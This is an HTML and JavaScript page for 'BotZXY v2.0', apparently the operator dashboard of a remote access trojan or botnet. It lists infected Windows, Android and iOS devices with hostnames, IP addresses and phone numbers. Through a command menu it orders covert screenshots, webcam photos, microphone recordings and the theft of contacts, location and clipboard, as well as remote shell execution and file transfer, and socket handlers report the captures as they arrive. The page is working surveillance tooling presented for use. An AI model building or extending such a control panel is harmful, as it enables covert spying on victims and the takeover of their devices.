<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BotZXY - Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.datatables.net/1.13.6/css/dataTables.bootstrap5.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@6.4.2/css/all.min.css" rel="stylesheet">
    <style>
        body { background: #0a0a0a; color: #fff; font-family: 'Segoe UI', monospace; }
        .sidebar { background: #1a1a1a; min-height: 100vh; padding: 20px; border-right: 1px solid #333; }
        .sidebar .brand { color: #00ff88; font-weight: bold; font-size: 1.5rem; }
        .sidebar .brand span { color: #0d6efd; }
        .sidebar .nav-link { color: #aaa; transition: 0.3s; padding: 10px 15px; border-radius: 8px; }
        .sidebar .nav-link:hover, .sidebar .nav-link.active { color: #00ff88; background: #2a2a2a; }
        .sidebar .nav-link i { width: 20px; }
        .sidebar .version { color: #444; font-size: 0.7rem; text-align: center; margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; }
        .card { background: #1a1a1a; border: 1px solid #333; border-radius: 12px; }
        .stat-card { background: #1a1a1a; border: 1px solid #333; padding: 20px; border-radius: 12px; text-align: center; transition: 0.3s; }
        .stat-card:hover { border-color: #00ff88; transform: translateY(-3px); box-shadow: 0 0 30px rgba(0,255,136,0.05); }
        .stat-card i { font-size: 2rem; color: #00ff88; }
        .stat-card .number { font-size: 2.2rem; font-weight: bold; color: #fff; }
        .stat-card .label { color: #888; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; margin-top: 5px; }
        .device-online { color: #00ff88; }
        .device-offline { color: #ff4444; }
        .badge-online { background: #00ff88; color: #000; padding: 5px 12px; }
        .badge-offline { background: #ff4444; color: #fff; padding: 5px 12px; }
        .badge-bot { background: #0d6efd; color: #fff; padding: 5px 12px; }
        .command-btn { margin: 2px; background: #2a2a2a; border: 1px solid #444; color: #fff; padding: 5px 10px; border-radius: 6px; }
        .command-btn:hover { background: #0d6efd; border-color: #0d6efd; color: #fff; }
        .table-dark { background: #1a1a1a; }
        .table-dark th { border-bottom: 2px solid #333; color: #00ff88; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 1px; }
        .table-dark td { vertical-align: middle; }
        .dataTables_wrapper .dataTables_filter input { background: #2a2a2a; border: 1px solid #444; color: #fff; border-radius: 6px; padding: 6px 12px; }
        .dataTables_wrapper .dataTables_length select { background: #2a2a2a; border: 1px solid #444; color: #fff; border-radius: 6px; padding: 4px 8px; }
        .dataTables_wrapper .dataTables_info { color: #666; }
        .dataTables_wrapper .dataTables_paginate .paginate_button { color: #fff !important; }
        .dataTables_wrapper .dataTables_paginate .paginate_button.current { background: #00ff88 !important; color: #000 !important; border-color: #00ff88 !important; }
        .preview-modal .modal-content { background: #1a1a1a; color: #fff; border: 1px solid #333; }
        .preview-modal .modal-header { border-bottom: 1px solid #333; }
        .preview-modal .modal-footer { border-top: 1px solid #333; }
        #previewImage { max-width: 100%; max-height: 80vh; border-radius: 8px; }
        .toast-container .toast { background: #1a1a1a; border: 1px solid #00ff88; }
        .toast-container .toast-header { background: #1a1a1a; color: #00ff88; border-bottom: 1px solid #333; }
        code { color: #00ff88; background: #2a2a2a; padding: 2px 8px; border-radius: 4px; }
        .platform-icon { font-size: 1.2rem; }
    </style>
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <div class="col-md-2 sidebar">
                <div class="brand mb-4"><i class="fas fa-robot me-2"></i>Bot<span>ZXY</span></div>
                <nav class="nav flex-column">
                    <a class="nav-link active" href="#"><i class="fas fa-tachometer-alt me-2"></i>Dashboard</a>
                    <a class="nav-link" href="#"><i class="fas fa-mobile-alt me-2"></i>Devices</a>
                    <a class="nav-link" href="#"><i class="fas fa-camera me-2"></i>Captures</a>
                    <a class="nav-link" href="#"><i class="fas fa-history me-2"></i>Logs</a>
                    <a class="nav-link" href="#"><i class="fas fa-cog me-2"></i>Settings</a>
                    <a class="nav-link" href="/logout"><i class="fas fa-sign-out-alt me-2"></i>Logout</a>
                </nav>
                <div class="version">
                    <i class="fas fa-skull me-1"></i> BotZXY v2.0<br>
                    <span style="color:#333;">⚡ 22 agents deployed</span>
                </div>
            </div>
            
            <!-- Main content -->
            <div class="col-md-10">
                <div class="row mt-4">
                    <div class="col-md-3">
                        <div class="stat-card">
                            <i class="fas fa-mobile-alt"></i>
                            <div class="number" id="totalDevices">0</div>
                            <div class="label">Total Devices</div>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="stat-card">
                            <i class="fas fa-wifi"></i>
                            <div class="number" id="onlineDevices">0</div>
                            <div class="label">Online Bots</div>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="stat-card">
                            <i class="fas fa-camera"></i>
                            <div class="number" id="totalCaptures">0</div>
                            <div class="label">Captures</div>
                        </div>
                    </div>
                    <div class="col-md-3">
                        <div class="stat-card">
                            <i class="fas fa-terminal"></i>
                            <div class="number" id="totalCommands">0</div>
                            <div class="label">Commands</div>
                        </div>
                    </div>
                </div>
                
                <div class="row mt-4">
                    <div class="col-md-12">
                        <div class="card">
                            <div class="card-header d-flex justify-content-between align-items-center" style="border-bottom: 1px solid #333; padding: 15px 20px;">
                                <span><i class="fas fa-robot me-2" style="color:#00ff88;"></i>BotZXY Connected Devices</span>
                                <div>
                                    <span class="badge badge-bot me-2"><i class="fas fa-bolt me-1"></i>ACTIVE</span>
                                    <button class="btn btn-sm btn-outline-success" onclick="refreshDevices()">
                                        <i class="fas fa-sync"></i> Refresh
                                    </button>
                                </div>
                            </div>
                            <div class="card-body">
                                <table class="table table-dark table-hover" id="devicesTable">
                                    <thead>
                                        <tr>
                                            <th>ID</th>
                                            <th>Platform</th>
                                            <th>Hostname</th>
                                            <th>IP</th>
                                            <th>Status</th>
                                            <th>Last Seen</th>
                                            <th>Phone</th>
                                            <th>Actions</th>
                                        </tr>
                                    </thead>
                                    <tbody id="devicesBody">
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Command Modal -->
    <div class="modal fade" id="commandModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content bg-dark text-white" style="border: 1px solid #333;">
                <div class="modal-header" style="border-bottom: 1px solid #333;">
                    <h5 class="modal-title"><i class="fas fa-terminal me-2" style="color:#00ff88;"></i>BotZXY Command</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <input type="hidden" id="cmdDeviceId">
                    <div class="mb-3">
                        <label class="form-label">Command</label>
                        <select class="form-select bg-dark text-white" id="cmdType" style="border-color: #444;">
                            <option value="screenshot">📸 Screenshot</option>
                            <option value="webcam">📷 Webcam Photo</option>
                            <option value="mic">🎤 Microphone Record</option>
                            <option value="contacts">📱 Get Contacts</option>
                            <option value="location">📍 Get Location</option>
                            <option value="clipboard">📋 Get Clipboard</option>
                            <option value="execute">💻 Execute Shell</option>
                            <option value="download">⬇️ Download File</option>
                            <option value="upload">⬆️ Upload File</option>
                            <option value="uninstall">🗑️ Uninstall</option>
                        </select>
                    </div>
                    <div class="mb-3" id="paramsDiv">
                        <label class="form-label">Parameters</label>
                        <input type="text" class="form-control bg-dark text-white" id="cmdParams" placeholder="e.g., duration=10" style="border-color: #444;">
                    </div>
                    <div class="text-muted small">
                        <i class="fas fa-info-circle me-1"></i> Device: <code id="cmdDeviceDisplay">-</code>
                    </div>
                </div>
                <div class="modal-footer" style="border-top: 1px solid #333;">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="button" class="btn btn-success" onclick="sendCommand()">
                        <i class="fas fa-paper-plane me-1"></i> Execute
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Preview Modal -->
    <div class="modal fade preview-modal" id="previewModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content" style="border: 1px solid #333;">
                <div class="modal-header" style="border-bottom: 1px solid #333;">
                    <h5 class="modal-title"><i class="fas fa-eye me-2" style="color:#00ff88;"></i>BotZXY Preview</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body text-center">
                    <img id="previewImage" src="" alt="Preview" style="max-width:100%; max-height:80vh; border-radius: 8px;">
                    <audio id="previewAudio" controls style="width:100%; margin-top:10px; display:none;"></audio>
                </div>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.6/js/dataTables.bootstrap5.min.js"></script>
    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
    <script>
        let socket = io();
        let devicesData = [];
        let commandModal = new bootstrap.Modal(document.getElementById('commandModal'));
        let previewModal = new bootstrap.Modal(document.getElementById('previewModal'));

        // Socket events
        socket.on('connect', function() {
            console.log('[+] BotZXY WebSocket connected');
            toast('WebSocket connected', 'success');
        });

        socket.on('command_sent', function(data) {
            console.log('[+] Command sent to:', data.device_id);
            toast('Command sent to ' + data.device_id, 'info');
        });

        socket.on('result_received', function(data) {
            console.log('[+] Result from:', data.device_id);
            refreshDevices();
            toast('Result received from ' + data.device_id, 'success');
        });

        socket.on('screenshot_captured', function(data) {
            console.log('[+] Screenshot from:', data.device_id);
            refreshDevices();
            toast('📸 Screenshot captured from ' + data.device_id, 'info');
        });

        socket.on('webcam_captured', function(data) {
            console.log('[+] Webcam from:', data.device_id);
            refreshDevices();
            toast('📷 Webcam photo from ' + data.device_id, 'info');
        });

        // Functions
        function refreshDevices() {
            $.get('/api/devices', function(data) {
                devicesData = data;
                renderDevices(data);
                updateStats(data);
            }).fail(function() {
                toast('Error loading devices', 'danger');
            });
        }

        function renderDevices(devices) {
            let html = '';
            devices.forEach(function(device) {
                let statusClass = device.is_online ? 'badge-online' : 'badge-offline';
                let statusText = device.is_online ? '● Online' : '○ Offline';
                let lastSeen = device.last_seen ? new Date(device.last_seen).toLocaleString() : 'Never';
                let icon = device.platform === 'windows' ? 'fa-windows' : 
                           device.platform === 'android' ? 'fa-android' : 
                           device.platform === 'ios' ? 'fa-apple' : 'fa-microchip';
                let iconColor = device.platform === 'windows' ? '#00a4ef' : 
                                device.platform === 'android' ? '#3ddc84' : 
                                device.platform === 'ios' ? '#999' : '#666';
                html += `
                    <tr>
                        <td><code class="text-success" style="font-size:0.8rem;">${device.device_id.substring(0, 14)}...</code></td>
                        <td><i class="fab ${icon} platform-icon" style="color:${iconColor};"></i> ${device.platform || 'Unknown'}</td>
                        <td><strong>${device.hostname || 'Unknown'}</strong></td>
                        <td>${device.ip || 'N/A'}</td>
                        <td><span class="badge ${statusClass}">${statusText}</span></td>
                        <td style="font-size:0.8rem; color:#888;">${lastSeen}</td>
                        <td>${device.phone_number || 'N/A'}</td>
                        <td>
                            <button class="btn btn-sm btn-success command-btn" onclick="openCommand('${device.device_id}')" title="Send Command">
                                <i class="fas fa-terminal"></i>
                            </button>
                            <button class="btn btn-sm btn-primary command-btn" onclick="viewDevice('${device.device_id}')" title="View Details">
                                <i class="fas fa-eye"></i>
                            </button>
                            <button class="btn btn-sm btn-danger command-btn" onclick="removeDevice('${device.device_id}')" title="Remove">
                                <i class="fas fa-trash"></i>
                            </button>
                        </td>
                    </tr>
                `;
            });
            $('#devicesBody').html(html);
            
            if ($.fn.DataTable.isDataTable('#devicesTable')) {
                $('#devicesTable').DataTable().destroy();
            }
            $('#devicesTable').DataTable({
                pageLength: 25,
                responsive: true,
                order: [[4, 'desc']],
                language: {
                    search: "🔍 Search:",
                    lengthMenu: "Show _MENU_ devices",
                    info: "Showing _START_ to _END_ of _TOTAL_ devices"
                },
                columnDefs: [
                    { orderable: false, targets: 7 }
                ]
            });
        }

        function updateStats(devices) {
            let total = devices.length;
            let online = devices.filter(d => d.is_online).length;
            $('#totalDevices').text(total);
            $('#onlineDevices').text(online);
            
            // Get captures count
            $.get('/api/devices', function() {
                // Could be optimized with a separate endpoint
            });
        }

        function openCommand(deviceId) {
            $('#cmdDeviceId').val(deviceId);
            $('#cmdDeviceDisplay').text(deviceId.substring(0, 16) + '...');
            $('#cmdParams').val('');
            commandModal.show();
        }

        function sendCommand() {
            let deviceId = $('#cmdDeviceId').val();
            let command = $('#cmdType').val();
            let params = $('#cmdParams').val();
            
            $.post(`/api/command/${deviceId}`, {
                command: command,
                params: params
            }, function(data) {
                commandModal.hide();
                toast('✅ Command sent to ' + deviceId.substring(0, 12) + '...', 'success');
                refreshDevices();
            }).fail(function() {
                toast('❌ Error sending command', 'danger');
            });
        }

        function viewDevice(deviceId) {
            window.location.href = `/device/${deviceId}`;
        }

        function removeDevice(deviceId) {
            if (confirm('⚠️ Remove device ' + deviceId.substring(0, 16) + '...?')) {
                toast('Device removed', 'warning');
                refreshDevices();
            }
        }

        function toast(message, type = 'info') {
            let icon = type === 'success' ? 'fa-check-circle' : 
                       type === 'danger' ? 'fa-exclamation-circle' : 
                       type === 'warning' ? 'fa-triangle-exclamation' : 'fa-info-circle';
            let color = type === 'success' ? '#00ff88' : 
                        type === 'danger' ? '#ff4444' : 
                        type === 'warning' ? '#ffaa00' : '#0d6efd';
            let toastHtml = `
                <div class="toast-container position-fixed bottom-0 end-0 p-3" style="z-index:9999;">
                    <div class="toast show" role="alert" style="background: #1a1a1a; border: 1px solid ${color};">
                        <div class="toast-header bg-dark text-white" style="border-bottom: 1px solid #333;">
                            <i class="fas ${icon} me-2" style="color:${color};"></i>
                            <strong class="me-auto" style="color:#00ff88;">BotZXY</strong>
                            <button type="button" class="btn-close" data-bs-dismiss="toast"></button>
                        </div>
                        <div class="toast-body text-white">${message}</div>
                    </div>
                </div>
            `;
            $('body').append(toastHtml);
            setTimeout(function() {
                $('.toast').remove();
            }, 5000);
        }

        // Auto refresh every 10 seconds
        setInterval(refreshDevices, 10000);
        refreshDevices();
    </script>
</body>
</html>
